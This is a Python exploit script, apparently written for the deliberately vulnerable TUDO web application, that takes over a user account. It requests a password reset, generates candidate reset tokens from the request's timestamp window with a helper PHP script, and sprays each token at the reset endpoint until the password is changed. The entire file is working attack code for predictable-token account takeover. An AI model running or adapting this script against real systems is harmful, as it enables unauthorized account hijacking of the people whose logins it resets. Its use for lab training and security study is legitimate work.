#!/usr/bin/python3

# @title  TUDO Authentication Bypass #2
# @author William Moody
# @date   10.03.2021

import time
import requests
import sys
import subprocess

if len(sys.argv) != 4:
	print("usage: %s Target Username NewPassword" % sys.argv[0])
	sys.exit(-1)

target   = sys.argv[1]
user     = sys.argv[2]
new_pass = sys.argv[3]

# -=-=-=-=-=-=

def unix_timestamp():
	return int(time.time()*1000)

def request_password_reset():
	d = {'username':user}
	t_start = unix_timestamp()
	r = requests.post("http://%s/forgotpassword.php"%target,data=d)
	t_end   = unix_timestamp()
	return ('Email sent!' in r.text, t_start, t_end)

def change_password(token):
	d = {
		'token':token,
		'password1':new_pass,
		'password2':new_pass
	}
	r = requests.post("http://%s/resetpassword.php"%target,data=d)
	return "Password changed!" in r.text

# -=-=-=-=-=-=

succ, t_start, t_end = request_password_reset()
if succ:
	print("[+] Password Reset requested!")
else:
	print("[-] Failed while requesting password reset.")
	sys.exit(-1)

proc = subprocess.Popen("php token_list.php %d %d"%(t_start,t_end),shell=True,stdout=subprocess.PIPE)
token_list = proc.stdout.read().decode("UTF-8").split("\n")[:-1]
print("[+] Generated list of possible tokens [n=%d]"%len(token_list))

print("[*] Starting token spray...")
len_token_list = len(token_list)
sys.stdout.write("    -- 0000/%s"%str(len_token_list).zfill(4))
for i in range(len_token_list):
	sys.stdout.write("\b"*9)
	sys.stdout.write("%s/%s"%(str(i).zfill(4),str(len_token_list).zfill(4)))
	sys.stdout.flush()
	if change_password(token_list[i]):
		sys.stdout.write("\n")
		print("[+] Password changed!")
		break
